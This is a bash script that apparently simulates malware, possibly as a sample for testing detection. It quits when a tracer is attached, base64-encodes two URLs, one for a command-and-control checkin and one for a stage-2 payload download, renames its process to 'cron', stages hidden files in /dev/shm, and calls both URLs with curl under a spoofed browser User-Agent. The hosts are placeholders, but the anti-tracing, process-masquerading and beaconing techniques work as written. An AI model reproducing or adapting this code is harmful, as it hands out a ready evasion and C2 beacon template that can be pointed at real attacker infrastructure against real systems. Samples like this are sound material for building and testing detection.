#!/bin/bash

# --- Anti-strace check ---
if [ -r /proc/self/status ]; then
    tracer_pid=$(grep -i "TracerPid" /proc/self/status | awk '{print $2}')
    if [ "$tracer_pid" != "0" ]; then
        exit 0
    fi

fi
# --- Obfuscated strings (base64) ---
# "http://malicious-command-and-control-server.com/api/v1/checkin"
url1=$(echo "aHR0cDovL21hbGljaW91cy1jb21tYW5kLWFuZC1jb250cm9sLXNlcnZlci5jb20vYXBpL3YxL2NoZWNraW4=" | base64 -d)
# "http://update-server-placeholder.local/download?payload=stage2"
url2=$(echo "aHR0cDovL3VwZGF0ZS1zZXJ2ZXItcGxhY2Vob2xkZXIubG9jYWwvZG93bmxvYWQ/cGF5bG9hZD1zdGFnZTI=" | base64 -d)


# Use exec -a to rename the process to "cron" (or "sshd") and run a subshell.
exec -a "cron" /bin/bash << EOF
    # This runs in a new process with name "cron"
    # Use /dev/shm for temporary files (memory-backed, less persistent)
    mkdir -p /dev/shm/.cache_bak
    echo "Simulated payload configuration data" > /dev/shm/.cache_bak/config.conf
    touch /dev/shm/.cache_bak/update.lock

    # Background sleep, record PID
    sleep 2 &
    echo $! > /dev/shm/.cache_bak/proc.pid

    # Network calls with custom User-Agent and timeout
    curl -s -A "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36" --connect-timeout 5 "$url1"
    curl -s -A "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36" --connect-timeout 5 "$url2"

    # Cleanup
    rm -f /dev/shm/.cache_bak/update.lock
EOF
